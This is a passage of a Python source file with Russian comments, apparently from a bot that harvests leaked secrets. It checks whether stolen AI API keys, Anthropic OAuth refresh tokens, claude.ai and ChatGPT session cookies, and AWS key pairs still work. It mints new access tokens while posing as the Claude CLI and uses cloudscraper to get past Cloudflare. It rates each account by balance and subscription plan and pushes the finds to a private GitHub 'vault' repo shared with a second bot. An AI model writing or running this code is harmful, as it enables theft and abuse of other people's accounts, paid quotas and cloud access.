        # вся история ревалидировалась и репостилась в TG). Фолбэк на .bak
        try:
            return set(json.load(open(SEEN_PATH + ".bak", encoding="utf-8-sig")))
        except Exception:
            return set()


def save_seen(seen):
    # перед перезаписью катим текущий файл в .bak (страховка от кривой записи)
    try:
        if os.path.exists(SEEN_PATH):
            os.replace(SEEN_PATH, SEEN_PATH + ".bak")
    except Exception:
        pass
    tmp = SEEN_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(sorted(seen), f)
    os.replace(tmp, SEEN_PATH)


def _atomic_json_dump(path, obj):
    """АУДИТ-фикс: tmp+replace для ВСЕХ state-файлов — голый open("w") при
    крэше/отключении питания оставлял обрезанный JSON, и следующий запуск
    молча стартовал с пустого состояния (attempts/stats/evolved терялись)."""
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception:
        pass


# ------------------------------------------------------------------ VAULT SYNC
# ОДИН МОЗГ НА ДВОИХ: локальный бот и GH-бот дедупятся через vault-репо —
# иначе одна и та же находка летит в TG дважды (сторы-то разные). Локальный
# тянет хэши находок из vault каждый цикл (дешёвый raw-фетч), и пушит свои
# находки обратно каждый 4-й цикл. GH-бот делает то же самое своим сторонам.
VAULT_REPO = CFG.get("vault_repo", "Ins2lt/night-vault")


def vault_pull_hashes(seen):
    """+хэши находок из vault-репы в seen. Возвращает число добавленных."""
    tok = gh_token()
    if not tok:
        return 0
    try:
        r = requests.get(
            "https://raw.githubusercontent.com/%s/main/keyhunter_found.jsonl"
            % VAULT_REPO,
            headers={"Authorization": "Bearer " + tok},
            timeout=(8, 25),
            verify=False,
        )
        if r.status_code != 200:
            return 0
        added = 0
        for line in r.text.splitlines():
            try:
                d = json.loads(line)
            except Exception:
                continue
            k, b = d.get("key"), d.get("base")
            if not k:
                continue
            h = khash(k, b)
            if h not in seen:
                seen.add(h)
                added += 1
        return added
    except Exception:
        return 0


def vault_push_finds():
    """Мерж локального found.jsonl в vault (дедуп по хэшу). PUT через
    contents API. Раз в 4 цикла — дальше GH-бот подтянет наши находки и
    перестанет их постить повторно."""
    tok = gh_token()
    if not tok:
        return
    import base64 as _b64

    try:
        local_lines = []
        if os.path.exists(STORE_PATH):
            with open(STORE_PATH, encoding="utf-8", errors="replace") as f:
                local_lines = [l for l in f.read().splitlines() if l.strip()]
        if not local_lines:
            return
        api = (
            "https://api.github.com/repos/%s/contents/keyhunter_found.jsonl"
            % VAULT_REPO
        )
        hdrs = {
            "Authorization": "Bearer " + tok,
            "Accept": "application/vnd.github+json",
        }
        r = requests.get(api, headers=hdrs, timeout=(8, 20), verify=False)
        sha, remote_text = None, ""
        if r.status_code == 200:
            j = r.json()
            sha = j.get("sha")
            try:
                remote_text = _b64.b64decode(j.get("content") or "").decode(
                    "utf-8", errors="replace"
                )
            except Exception:
                remote_text = ""
        elif r.status_code == 404:
            sha, remote_text = None, ""  # файла ещё нет — создадим
        else:
            return  # 401/403/5xx: заливка без актуального sha бессмысленна
            # (было: sha=None при существующем файле = PUT обречён)
        have = set()
        for line in remote_text.splitlines():
            try:
                d = json.loads(line)
            except Exception:
                continue
            have.add(khash(d.get("key", ""), d.get("base")))
        merged = remote_text.rstrip("\n")
        added = 0
        for line in local_lines:
            try:
                d = json.loads(line)
            except Exception:
                continue
            h = khash(d.get("key", ""), d.get("base"))
            if h in have:
                continue
            have.add(h)
            merged += "\n" + line
            added += 1
        if not added:
            return
        body = {
            "message": "vault sync from local %s"
            % time.strftime("%FT%TZ", time.gmtime()),
            "content": _b64.b64encode((merged + "\n").encode()).decode(),
        }
        if sha:
            body["sha"] = sha
        for _attempt in range(2):
            pr = requests.put(
                api, headers=hdrs, json=body, timeout=(10, 30), verify=False
            )
            if pr.status_code == 409 and _attempt == 0:
                # гонка с GH-ботом: перекурываем sha и ретраим ОДИН раз
                # (было: 409 = весь батч тихо терялся до следующего 4-го цикла)
                try:
                    r2 = requests.get(api, headers=hdrs, timeout=(8, 20), verify=False)
                    if r2.status_code == 200:
                        body["sha"] = r2.json().get("sha")
                        continue
                except Exception:
                    pass
            break
        if pr.status_code in (200, 201):
            log("  🧠 vault sync: +%d находок ушло в общий мозг" % added)
    except Exception:
        pass


def khash(key, base):
    return hashlib.sha1((key + "|" + (base or "?")).encode()).hexdigest()[:16]


# ------------------------------------------------------------------ VALIDATOR
STAR_RE = re.compile(
    r"(opus-4-[5-9]|opus-4\.[5-9]|opus-5|fable|sonnet-5|gpt-5\.[4-6]|glm-5\.[23]|"
    r"deepseek-v4|kimi-k3|kimi-k2\.[5-9]|minimax-m3|qwen-?3\.8|gemini-3|grok-4\.[2-9]|"
    r"nemotron-3|mimo-v2|minimax-m2|deepseek-r2)",
    re.I,
)
EMBED_RE = re.compile(r"(bge|embedding|embed-|gte-|text-embedding)", re.I)
RERANK_RE = re.compile(r"(rerank|bge-reranker|reranker)", re.I)


def bearer(key):
    return {"Authorization": "Bearer " + key}


# приоритет звёздных моделей для проб: самое жирное первым (не алфавит!)
def _star_rank(m):
    ml = str(m).lower()
    if "opus-4-8" in ml or "opus-4.8" in ml or "opus-5" in ml:
        return 0
    if "fable" in ml or "sonnet-5" in ml:
        return 1
    if "opus-4" in ml:
        return 2
    if "gpt-5.6" in ml or "gpt-5.5" in ml:
        return 3
    if "gemini-3" in ml or "grok-4" in ml:
        return 4
    if "glm-5.3" in ml or "deepseek-v4-pro" in ml or "kimi-k3" in ml:
        return 5
    return 9


def try_bases(base_hint, tag):
    bases = []
    if base_hint:
        bases.append(base_hint.rstrip("/"))
        b = base_hint.rstrip("/")
        if not re.search(r"/v\d+$|open-apis|compatible-mode|api/paas|/api$", b):
            bases.append(b + "/v1")
    for t, _, cands, _ in KEY_PATTERNS:
        if t == tag:
            bases += [c for c in cands if c not in bases]
    # УМНОСТЬ: голый sk-ключ без контекста пробуем против ВСЕХ relay-баз
    # с лидербордов (утечки китайских релеев часто без контекста)
    # АУДИТ-фикс: +bearer/sk20 — "Authorization: Bearer <token>" строки без
    # URL рядом раньше получали bases=[] -> validate молча return None.
    # Fail-closed контроли в validate() (PUBLIC_MODELS_BASES и ко) режут
    # slug-спам, так что расширение безопасно.
    if tag in ("sk32", "sklong", "skgen", "sk20", "bearer") and not base_hint:
        bases += relay_bases()
    return bases


def relay_bases():
    """Relay-базы из relay_boards.json + хардкод (new-api инстансы)."""
    bases = []
    try:
        with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
            for r in json.load(f):
                if r.get("alive") and r.get("api_base"):
                    bases.append(r["api_base"].rstrip("/"))
    except Exception:
        pass
    # хардкод топ-релеев + все известные базы из анализа TG-выгрузок
    bases += list(KNOWN_BASES.keys())
    bases += [
        "https://api.tu-zi.com/v1",
        "https://api.apiyi.com/v1",
        "https://yunwu.ai/v1",
        "https://www.dmxapi.cn/v1",
        "https://api.gptsapi.net/v1",
        "https://api.pro365.top/v1",
        "https://api.v3.cm/v1",
    ]
    return list(dict.fromkeys(bases))


def probe_models(base, key, timeout=(8, 18)):
    """Список моделей. /models, /v1/models; Bearer -> x-api-key фолбэк (relay-панели
    с anthropic-эндпоинтами принимают только x-api-key — иначе теряли ключи!).
    SPEEDUP: все комбинации суффикс×заголовок — ОДНИМ параллельным пакетом
    (было: до 6 запросов последовательно, каждое со своим таймаут-окном)."""
    base_r = base.rstrip("/")
    combos = []
    for suffix in ("/models", "/v1/models"):
        if suffix == "/v1/models" and base_r.endswith("/v1"):
            continue  # не дублируем
        for hdr in (
            bearer(key),
            {"x-api-key": key, "anthropic-version": "2023-06-01"},
            {"api-key": key},  # Azure-стиль (bifrost и др. azure-релеи)
        ):
            combos.append((base_r + suffix, hdr))
    if not combos:
        return None

    def _one(url_hdr):
        url, hdr = url_hdr
        try:
            r = http("GET", url, timeout=timeout, headers=hdr)
            if r.status_code == 200:
                j = r.json()
                data = j.get("data") if isinstance(j, dict) else j
                if isinstance(data, list):
                    ids = [m.get("id", "") for m in data if isinstance(m, dict)]
                    if ids:
                        return ids
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(combos)) as ex:
        results = list(ex.map(_one, combos))
    # приоритет исходного порядка: /models+Bearer -> x-api-key -> api-key -> /v1/...
    for ids in results:
        if ids:
            return ids
    return None


NO_BALANCE_MARKERS = (
    "quota",
    "balance",
    "credit",
    "insufficient",
    "billing",
    "top up",
    "topup",
    "out of funds",
    "no remaining",
    "insufficient_balance",
    "credit balance",
    "low balance",
    "depleted",
    "usage limit",
    "spending limit",
    "hard limit",
    # китайские маркеры
    "余额",
    "额度",
    "不足",
    "充值",
    "欠费",
    "超支",
    "限额",
    "余额不足",
)


def classify_chat(status, body):
    """(status, body) -> state: working|no_balance|invalid_key|forbidden|not_found|rate|server|unknown"""
    bl = (body or "").lower()
    if status == 200:
        return "working", ""
    if any(k in bl for k in NO_BALANCE_MARKERS):
        return "no_balance", body[:120]
    if status == 402:
        return "no_balance", body[:120]
    if status == 401:
        return "invalid_key", body[:120]
    if status == 403:
        # 403 + quota words = valid key no balance
        if any(k in bl for k in NO_BALANCE_MARKERS):
            return "no_balance", body[:120]
        # 403 + auth-маркеры = мёртвый ключ (sarvam: invalid_api_key_error и т.п.)
        if any(
            k in bl
            for k in (
                "invalid",
                "authentication",
                "unauthorized",
                "api key",
                "not valid",
                "invalid_api_key",
            )
        ):
            return "invalid_key", body[:120]
        return "forbidden", body[:120]
    if status == 404:
        return "not_found", body[:120]
    if status == 429:
        return "rate_limited", body[:120]
    if status >= 500:
        return "server_error", body[:120]
    return "unknown", body[:120]


def classify_err_body(body):
    """Честная классификация тела ошибки: для 200-ответов с error внутри и
    mid-stream SSE-ошибок. FIX: раньше такие шли через classify_chat(200,...),
    который ВСЕГДА возвращает 'working' = ложные срабатывания (релеи шлют
    'insufficient quota' с HTTP 200 и проходили как рабочие)."""
    bl = (body or "").lower()
    if any(k in bl for k in NO_BALANCE_MARKERS):
        return "no_balance", (body or "")[:120]
    if any(
        k in bl
        for k in (
            "invalid",
            "unauthorized",
            "authentication",
            "api key",
            "api_key",
            "not valid",
        )
    ):
        return "invalid_key", (body or "")[:120]
    if "not found" in bl or "no such model" in bl or "does not exist" in bl:
        return "not_found", (body or "")[:120]
    return "server_error", (body or "")[:120]


def _chat_variant_state(base, key, body, headers=None, timeout=(7, 20)):
    """Один POST /chat/completions (один вариант тела). -> (state, detail).
    SSE парсится на mid-stream ошибки; 200-JSON с error внутри и 200-не-JSON
    классифицируются честно (не 'working')."""
    try:
        stream = bool(body.get("stream"))
        r = http(
            "POST",
            base.rstrip("/") + "/chat/completions",
            timeout=timeout,
            headers=headers or bearer(key),
            json_body=body,
            stream=stream,
        )
    except Exception:
        return "net", ""
    if r.status_code != 200:
        return classify_chat(r.status_code, r.text)
    if stream:
        # парсим SSE: ловим mid-stream {"error": ...}
        content, sse_err, saw_data = "", "", False
        for raw in r.iter_lines(decode_unicode=True):
            raw_s = raw if isinstance(raw, str) else raw.decode("utf-8", "replace")
            if not raw_s or not raw_s.startswith("data:"):
                continue
            saw_data = True
            d = raw_s[5:].strip()
            if d == "[DONE]":
                break
            try:
                j = json.loads(d)
            except Exception:
                continue
            if j.get("error"):
                sse_err = json.dumps(j["error"])[:200]
                break
            for ch in j.get("choices") or []:
                delta = ch.get("delta") or {}
                if delta.get("content"):
                    content += str(delta["content"])
        if sse_err:
            # FIX: было classify_chat(200, sse_err) = всегда 'working'
            return classify_err_body(sse_err)
        if content.strip():
            return "working", ""
        if saw_data:
            # настоящий SSE (были data:-строки), но контент пуст —
            # модель может быть немой на ping
            return "working", ""
        # 200, но НЕ SSE вообще (HTML/GIF/мусор) — это НЕ LLM-эндпоинт
        return "unknown", ""
    # 200 не-stream
    try:
        j = r.json()
    except Exception:
        # 200 не-JSON (HTML прокси-страница) — не chat-эндпоинт
        return "unknown", ""
    ch = (j.get("choices") or [{}])[0]
    if ((ch.get("message") or {}).get("content") or "").strip() or ch.get(
        "finish_reason"
    ):
        return "working", ""
    # 200 JSON с error внутри (некоторые релеи шлют ошибки с 200)
    if j.get("error"):
        # FIX: было classify_chat(200, ...) = всегда 'working'
        return classify_err_body(json.dumps(j["error"]))
    # 200 JSON без choices = это не chat-ответ (самодельные панели,
    # логин-страницы с JSON, редиректы) — НЕ считаем рабочим
    return "unknown", ""


def _chat_alt_headers(base, key, body):
    """Фолбэк на alt-заголовки: relay с anthropic-эндпоинтами отдают 401 на
    Bearer, но принимают x-api-key; Azure-релеи — только api-key!
    Оба запроса — параллельно. -> (state, detail) | None"""
    alt_hdrs = (
        {"x-api-key": key, "Content-Type": "application/json"},
        {"api-key": key, "Content-Type": "application/json"},
    )
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
            futs = [
                ex.submit(_chat_variant_state, base, key, body, h, (8, 25))
                for h in alt_hdrs
            ]
            for f in concurrent.futures.as_completed(futs):
                st2, dt2 = f.result()
                if st2 == "working":
                    return "working", "via alt-header"
                if st2 == "no_balance":
                    return "no_balance", dt2
    except Exception:
        pass
    return None


def quick_chat(base, key, model):
    """Робастная проба чата. -> (state, detail).
    SPEEDUP: быстрый путь — plain-тело, 1 запрос (покрывает большинство).
    Смысловые ошибки (no_balance/403/429/404) — сразу вердикт, без перебора.
    401 -> alt-заголовки параллельно. Форматные ошибки (400/unknown/5xx/net)
    -> остальные 3 варианта тел параллельным пакетом (было: 4+2 последовательно)."""
    variants = [
        {
            "model": model,
            "messages": [{"role": "user", "content": "Reply with the single word: OK"}],
        },
        {
            "model": model,
            "max_completion_tokens": 32,
            "messages": [{"role": "user", "content": "Reply with the single word: OK"}],
        },
        {
            "model": model,
            "max_tokens": 16,
            "messages": [{"role": "user", "content": "Reply with the single word: OK"}],
        },
        {
            "model": model,
            "max_tokens": 16,
            "stream": True,
            "messages": [{"role": "user", "content": "Reply with the single word: OK"}],
        },
    ]
    # --- фаза 1: plain-тело (одиночный запрос) ---
    st0, dt0 = _chat_variant_state(base, key, variants[0])
    if st0 == "working":
        return "working", ""
    if st0 in ("no_balance", "forbidden", "rate_limited", "not_found"):
        # смысловая ошибка, не формат тела — остальные варианты не помогут
        return st0, dt0
    if st0 == "invalid_key":
        alt = _chat_alt_headers(base, key, variants[0])
        if alt:
            return alt
        return st0, dt0  # жёсткий стоп — ключ мёртв
    # --- фаза 2: остальные варианты тел — параллельным пакетом ---
    states = [st0]
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
        futs = {
            ex.submit(_chat_variant_state, base, key, b): i
            for i, b in enumerate(variants[1:], 1)
        }
        for f in concurrent.futures.as_completed(futs):
            try:
                st = f.result()[0]
            except Exception:
                st = "net"
            if st == "working":
                return "working", ""
            states.append(st)
    # итог: рабочий > no_balance > invalid_key > неопределён
    if "no_balance" in states:
        return "no_balance", "quota/balance error"
    if "invalid_key" in states:
        # 401 проявился на одном из вариантов — фолбэк на alt-заголовки
        alt = _chat_alt_headers(base, key, variants[0])
        if alt:
            return alt
        return "invalid_key", ""
    return states[0] if states else "unknown", ""


def probe_balance(base, key):
    """Баланс: new-api /api/user/self + dashboard/billing + openrouter auth/key.
    SPEEDUP: все 5 путей — одним параллельным пакетом (было: последовательно)."""
    paths = (
        "/api/user/self",
        "/dashboard/billing/subscription",
        "/dashboard/billing/credit/grants",
        "/dashboard/billing/usage",
        "/api/v1/auth/key",
    )
    headers = bearer(key)
    base_r = base.rstrip("/")

    def _one(path):
        try:
            r = http("GET", base_r + path, timeout=(8, 15), headers=headers)
            if r.status_code == 200:
                try:
                    return path, r.json()
                except Exception:
                    return None
        except Exception:
            pass
        return None

    out = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(paths)) as ex:
        for res in ex.map(_one, paths):
            if res:
                out[res[0].rsplit("/", 1)[-1] or "self"] = res[1]
    return out


def quota_usd(bal):
    """Баланс в USD из всех известных форматов."""
    # new-api /api/user/self: quota в единицах 500000 = $1
    selfdata = bal.get("self") or {}
    d = selfdata.get("data") or selfdata
    if isinstance(d, dict):
        q = d.get("quota")
        used = d.get("used_quota") or 0
        if isinstance(q, (int, float)) and q > 0:
            remaining = (q - (used or 0)) / 500000.0
            return round(remaining, 4)
    # openrouter /api/v1/auth/key: limit_remaining
    authkey = bal.get("key") or {}
    if isinstance(authkey, dict):
        d2 = authkey.get("data") or {}
        if isinstance(d2, dict):
            lr = d2.get("limit_remaining")
            if isinstance(lr, (int, float)):
                return round(lr, 4)
    # dashboard billing subscription (hard_limit в USD)
    sub = bal.get("subscription") or {}
    for k in ("hard_limit_usd", "system_hard_limit_usd"):
        v = sub.get(k)
        if isinstance(v, (int, float)) and 0 < v < 100_000_000:
            return round(v, 4)
    # grants: total_available
    grants = bal.get("grants") or {}
    if isinstance(grants, dict):
        ta = grants.get("total_available")
        if isinstance(ta, (int, float)) and ta > 0:
            return round(ta, 4)
    return None


def tier_from(bal):
    sub = bal.get("subscription") or {}
    hard = sub.get("hard_limit_usd") or sub.get("system_hard_limit_usd")
    if isinstance(hard, (int, float)) and hard >= 100_000_000:
        return "без лимита ключа"
    if isinstance(hard, (int, float)) and hard > 0:
        return "limit %s USD" % hard
    return None


def money(bal):
    return quota_usd(bal)


def quick_embed(base, key, model):
    try:
        r = http(
            "POST",
            base.rstrip("/") + "/embeddings",
            timeout=(8, 15),
            headers=bearer(key),
            json_body={"model": model, "input": "hi"},
        )
        return r.status_code == 200
    except Exception:
        return False


def quick_rerank(base, key, model):
    try:
        r = http(
            "POST",
            base.rstrip("/") + "/rerank",
            timeout=(8, 15),
            headers=bearer(key),
            json_body={"model": model, "query": "hi", "documents": ["a", "b"]},
        )
        return r.status_code == 200
    except Exception:
        return False


def validate_google(key):
    """Google AI Studio (Gemini): generativelanguage API с ?key= auth.
    Даёт gemini-3-pro / 2.5-pro жир при валиде."""
    base = "https://generativelanguage.googleapis.com/v1beta"
    try:
        r = http("GET", base + "/models?key=" + key, timeout=(10, 25))
        if r is None:
            return None
        if r.status_code == 400 and "API key not valid" in r.text:
            return None  # мёртв (точный вердикт Google)
        if r.status_code in (403,):
            # АУДИТ-фикс: 403 ≠ мёртв. Это и "API не включена на проекте",
            # и referrer/IP-restriction — ключ ВАЛИДЕН, просто ограничен.
            # (рестриктед-ключи часто работают с правильным Origin/IP)
            return {
                "key": key,
                "base": base,
                "tag": "google",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "Google AI Studio (403: restricted или API off)",
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "listed_only",
                "note": "403: рестрикция/выключен API — ключ, вероятно, живой",
            }
        if r.status_code == 429:
            # rate limit = ключ ВАЛИДЕН
            return {
                "key": key,
                "base": base,
                "tag": "google",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "Google AI Studio",
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "no_balance",
                "note": "rate limited (валиден)",
            }
        if r.status_code != 200:
            return None
        models = [m.get("name", "").split("/")[-1] for m in r.json().get("models", [])]
        stars = sorted({m for m in models if STAR_RE.search(m)})
        # чат-проба жирной моделью
        test_model = None
        for pref in (
            "gemini-3-pro",
            "gemini-2.5-pro",
            "gemini-3-flash",
            "gemini-2.5-flash",
            "gemini-2.0-flash",
        ):
            if pref in models:
                test_model = pref
                break
        working = []
        if test_model:
            try:
                r2 = http(
                    "POST",
                    base + "/models/" + test_model + ":generateContent?key=" + key,
                    timeout=(10, 30),
                    json_body={"contents": [{"parts": [{"text": "say OK"}]}]},
                )
                if r2 is not None and r2.status_code == 200:
                    working = [test_model]
            except Exception:
                pass
        status = "working" if working else ("listed_only" if models else None)
        if status is None:
            return None
        return {
            "key": key,
            "base": base,
            "tag": "google",
            "origin": "direct",
            "ts": time.time(),
            "models": models[:400],
            "n_models": len(models),
            "stars_listed": stars,
            "stars_working": working,
            "balance": None,
            "tier": "Google AI Studio",
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": status,
        }
    except Exception:
        return None


def validate_ort01(key):
    """REFRESH-токен Claude: пробуем минтить свежий oat01 через OAuth-флоу CC.
    Отминтился -> тир-тест минта (это тир АККАУНТА = подписка!)."""
    try:
        r = http(
            "POST",
            "https://console.anthropic.com/v1/oauth/token",
            timeout=(10, 30),
            headers={
                "Content-Type": "application/json",
                "User-Agent": "claude-cli/2.1.241 (external, cli)",
            },
            json_body={
                "grant_type": "refresh_token",
                "refresh_token": key,
                "client_id": "9d1c250a-e61b-44d9-88ed-5944d1962f5e",
            },
        )
        if r is not None and r.status_code == 200:
            d = r.json()
            at = d.get("access_token", "")
            if at.startswith("sk-ant-oat01"):
                # тир-тест минтнутого токена = тир аккаунта!
                tier = _oat01_tier(at)
                org = (d.get("organization") or {}).get("name") or "?"
                return {
                    "key": key,
                    "base": "https://api.anthropic.com/v1",
                    "tag": "anthropic-refresh",
                    "origin": "oauth-mint",
                    "ts": time.time(),
                    "models": [],
                    "n_models": 0,
                    "stars_listed": [],
                    "stars_working": [],
                    "balance": None,
                    "tier": "REFRESH->%s (%s)" % (tier, org),
                    "usage": {"minted_access_token": at},
                    "embed": None,
                    "rerank": None,
                    "status": "working",
                }
    except Exception:
        pass
    return None


def _oat01_tier(key):
    """Тир oat01: haiku=free, +sonnet=PRO, +opus=MAX. Возвращает 'free/PRO/MAX/dead'."""
    h = {
        "Authorization": "Bearer " + key,
        "anthropic-version": "2023-06-01",
        # КРИТИЧНО: без oauth-beta хедера api.anthropic.com отвечает 401 на
        # ВАЛИДНЫЕ oat01 (OAuth-флоу Claude Code требует этот флаг с 2025-04)!
        "anthropic-beta": "oauth-2025-04-20",
        "Content-Type": "application/json",
    }
    try:
        for model, tier in (
            ("claude-opus-4-8", "MAX"),
            ("claude-sonnet-4-5", "PRO"),
        ):
            r = http(
                "POST",
                "https://api.anthropic.com/v1/messages",
                timeout=(8, 25),
                headers=h,
                json_body={
                    "model": model,
                    "max_tokens": 4,
                    "messages": [{"role": "user", "content": "hi"}],
                },
            )
            if r is None:
                continue
            if r.status_code == 200:
                return tier
            if r.status_code == 429:
                # ЛЮБОЙ 429 на платной модели = модель доступна аккаунту,
                # выжжено окно квоты (free получил бы permission/not_found,
                # а не rate limit). Старое условие требовало "would exceed",
                # но живой ответ {"message":"Error"} без этого маркера ->
                # платные аккаунты ошибочно классифицировались как free.
                if "would exceed" in (r.text or ""):
                    return tier + " [недельная квота выжжена]"
                return tier + " [окно квоты выжжено]"
        # haiku-проба (free tier)
        r = http(
            "POST",
            "https://api.anthropic.com/v1/messages",
            timeout=(8, 25),
            headers=h,
            json_body={
                "model": "claude-haiku-4-5",
                "max_tokens": 4,
                "messages": [{"role": "user", "content": "hi"}],
            },
        )
        if r is not None and r.status_code == 200:
            return "free"
        return "dead"
    except Exception:
        # АУДИТ-фикс: сетевой сбой ≠ "dead" — тир "REFRESH->dead" при живой
        # сессии вводил в заблуждение. unknown = не знаем.
        return "unknown"


def validate_sid01(key):
    """Web-сессия claude.ai: живая сессия = полный доступ к подписке аккаунта
    (вкл. КОРПОРАТИВНЫЕ). Проверка через /api/organizations.
    claude.ai за Cloudflare: голый requests с датацентра = 403 -> cloudscraper!"""
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
        "Cookie": "sessionKey=" + key,
    }
    try:
        # requests сначала; если CF отбил (403/503/None) — cloudscraper-фолбэк
        try:
            r = http(
                "GET",
                "https://claude.ai/api/organizations",
                timeout=(10, 25),
                headers=hdrs,
            )
        except Exception:
            r = None
        if r is None or r.status_code in (403, 503):
            r = _cloud_get_hdrs(
                "https://claude.ai/api/organizations", hdrs, timeout=(12, 25)
            )
        if r is not None and r.status_code == 200:
            try:
                orgs = r.json()
                if isinstance(orgs, list) and orgs:
                    names = "; ".join((o.get("name", "?")[:40]) for o in orgs[:3])
                    # 🔖 план аккаунта: rate_limit_tier показывает free/pro/max
                    tier_info = ""
                    try:
                        org_uuid = orgs[0].get("uuid")
                        rr = http(
                            "GET",
                            "https://claude.ai/api/organizations/%s/rate_limits"
                            % org_uuid,
                            timeout=(8, 15),
                            headers=hdrs,
                        )
                        if rr is not None and rr.status_code == 200:
                            rj = rr.json() or {}
                            raw_tier = str(rj.get("rate_limit_tier") or "?")
                            plan = "FREE"
                            for pref, label in (
                                ("claude_max_20x", "MAX_20x 🔥🔥"),
                                ("claude_max_5x", "MAX_5x 🔥"),
                                ("claude_max", "MAX 🔥"),
                                ("claude_pro", "PRO"),
                                ("claude_team", "TEAM"),
                                ("enterprise", "CORP/ENTERPRISE 🔥🔥🔥"),
                                ("default_claude_ai", "FREE"),
                            ):
                                if raw_tier.startswith(pref):
                                    plan = label
                                    break
                            groups = [
                                str(g.get("model_group", ""))
                                for g in (rj.get("tier_model_rate_limiters") or [])
                            ][:6]
                            tier_info = " | план: %s | группы: %s" % (
                                plan,
                                ",".join(groups) or "-",
                            )
                    except Exception:
                        pass
                    return {
                        "key": key,
                        "base": "https://claude.ai",
                        "tag": "anthropic-web",
                        "origin": "web-session",
                        "ts": time.time(),
                        "models": [],
                        "n_models": 0,
                        "stars_listed": [],
                        "stars_working": [],
                        "balance": None,
                        "tier": "WEB-СЕССИЯ (orgs: %s)%s" % (names, tier_info),
                        "usage": None,
                        "embed": None,
                        "rerank": None,
                        "status": "working",
                    }
            except Exception:
                pass
    except Exception:
        pass
    return None


def validate_openai_web(key):
    """ChatGPT web-сессия: cookie __Secure-next-auth.session-token (JWE).
    /api/auth/session -> аккаунт жив; /backend-api/accounts/check -> план
    (Free/Plus/Pro/Team/Business). CF -> cloudscraper-фолбэк."""
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/126.0 Safari/537.36",
        "Cookie": "__Secure-next-auth.session-token=" + key,
    }
    try:
        try:
            r = http(
                "GET",
                "https://chatgpt.com/api/auth/session",
                timeout=(10, 25),
                headers=hdrs,
            )
        except Exception:
            r = None
        if r is None or r.status_code in (403, 503):
            r = _cloud_get_hdrs(
                "https://chatgpt.com/api/auth/session", hdrs, timeout=(12, 25)
            )
        if r is None or r.status_code != 200:
            return None
        try:
            j = r.json()
        except Exception:
            return None
        if not j or not (j.get("user") or j.get("accessToken")):
            return None  # пустая сессия = мёртвый токен
        email = (j.get("user") or {}).get("email") or "?"
        # план: accounts/check
        plan = "free?"
        try:
            r2 = http(
                "GET",
                "https://chatgpt.com/backend-api/accounts/check",
                timeout=(10, 20),
                headers=hdrs,
            )
            if r2 is not None and r2.status_code == 200:
                plans = set()
                for _acc_id, acc in (r2.json().get("accounts") or {}).items():
                    ent = acc.get("entitlement") or {}
                    sub = (
                        ent.get("subscription_id") or ent.get("subscription_plan") or ""
                    )
                    if sub:
                        plans.add(str(sub))
                plan = ",".join(sorted(plans)) or "free"
        except Exception:
            pass
        return {
            "key": key,
            "base": "https://chatgpt.com",
            "tag": "openai-web",
            "origin": "web-session",
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "CHATGPT-СЕССИЯ (%s | план: %s)" % (email, plan),
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


def validate_aws(key, origin=None):
    """AWS AccessKeyId+SecretKey (пара из утечки): подписанный sigv4-запрос
    STS GetCallerIdentity. 200 = ключи живы (account_id, user, arn в тире)."""
    import hashlib
    import hmac as hmac_mod

    m = re.match(r"(AKIA[0-9A-Z]{16})[\s\"':=,;a-zA-Z_]{1,50}([A-Za-z0-9/+=]{40})", key)
    if not m:
        return None
    ak, sk = m.group(1), m.group(2)
    try:
        host = "sts.amazonaws.com"
        service = "sts"
        region = "us-east-1"
        amz_date = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
        date_stamp = amz_date[:8]
        body = "Action=GetCallerIdentity&Version=2011-06-15"
        canonical = (
            "POST\n/\n\ncontent-type:application/x-www-form-urlencoded\n"
            "host:%s\nx-amz-date:%s\n\n"
            "content-type;host;x-amz-date\n%s"
            % (host, amz_date, hashlib.sha256(body.encode()).hexdigest())
        )
        scope = "%s/%s/%s/aws4_request" % (date_stamp, region, service)
        sts = "AWS4-HMAC-SHA256\n%s\n%s\n%s" % (
            amz_date,
            scope,
            hashlib.sha256(canonical.encode()).hexdigest(),
        )

        def _h(b, k):
            return hmac_mod.new(k, b.encode(), hashlib.sha256).digest()

        k_date = _h(date_stamp, ("AWS4" + sk).encode())
        k_region = _h(region, k_date)
        k_service = _h(service, k_region)
        k_signing = _h("aws4_request", k_service)
        sig = hmac_mod.new(k_signing, sts.encode(), hashlib.sha256).hexdigest()
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Amz-Date": amz_date,
            "Authorization": (
                "AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders="
                "content-type;host;x-amz-date, Signature=%s" % (ak, scope, sig)
            ),
        }
        r = http(
            "POST",
            "https://sts.amazonaws.com/",
            timeout=(10, 20),
            headers=headers,
            data=body,
        )
        if r is None or r.status_code != 200:
            return None
        arn_m = re.search(r"<Arn>([^<]+)</Arn>", r.text)
        acc_m = re.search(r"<Account>([^<]+)</Account>", r.text)
        # ОФЛАЙН-ДЕКОД (fwd:cloudsec рецепт): account id зашит в сам AKIA
        # (chars 5-14 = base32, >>7 & 40bit). Фолбэк если XML-парс промахнулся
        # (был кейс "account: ?" при живом ключе). Проверено на живом: OK.
